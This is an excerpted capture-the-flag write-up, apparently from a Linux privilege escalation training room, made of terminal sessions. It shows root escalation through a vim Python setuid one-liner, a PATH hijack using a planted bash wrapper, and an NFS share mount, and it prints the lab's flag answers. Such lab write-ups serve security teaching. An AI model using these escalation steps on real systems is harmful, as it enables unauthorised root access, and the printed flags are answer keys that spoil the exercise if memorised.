...
karen@ip-10-10-79-111:~$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
...
```
karen@ip-10-10-78-225:/home/murdoch$ find / -writable 2>/dev/null | cut -d "/" -f2 | sort -u
dev
etc
home
proc
...
karen@ip-10-10-78-225:/home$ find /home -writable 2>/dev/null
/home/murdoch
...
```
karen@ip-10-10-78-225:/home/murdoch$ echo "/bin/bash" > thm
karen@ip-10-10-78-225:/home/murdoch$ chmod +x thm
karen@ip-10-10-78-225:/home/murdoch$ ./test
sh: 1: thm: not found
karen@ip-10-10-78-225:/home/murdoch$ export PATH=/home/murdoch/:$PATH
karen@ip-10-10-78-225:/home/murdoch$ ./test
root@ip-10-10-78-225:/home/murdoch# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-10-78-225:/home/murdoch# cd /home/ubuntu/
root@ip-10-10-78-225:/home/ubuntu# ls -la
total 36
drwxr-xr-x 5 ubuntu ubuntu 4096 Oct 22  2021 .
drwxr-xr-x 5 root   root   4096 Jun 20  2021 ..
-rw------- 1 ubuntu ubuntu  363 Oct 22  2021 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Jun 20  2021 .cache
drwxrwxr-x 3 ubuntu ubuntu 4096 Oct 22  2021 .local
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------ 2 ubuntu ubuntu 4096 Jun 20  2021 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Jun 20  2021 .sudo_as_admin_successful
root@ip-10-10-78-225:/home/ubuntu# cat /home/matt/flag6.txt
THM-736628929
```
...
┌──(kali㉿kali)-[~/tryhackme/linprivesc]
└─$ sudo mount -t nfs 10.10.245.200:/tmp /tmp/share 
...
```
karen@ip-10-10-217-18:/tmp$ ./nfs 
root@ip-10-10-217-18:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-10-217-18:/tmp# find / -name flag7.txt 2>/dev/null
/home/matt/flag7.txt
root@ip-10-10-217-18:/tmp# cat /home/matt/flag7.txt 
THM-89384012
root@ip-10-10-217-18:/tmp# 
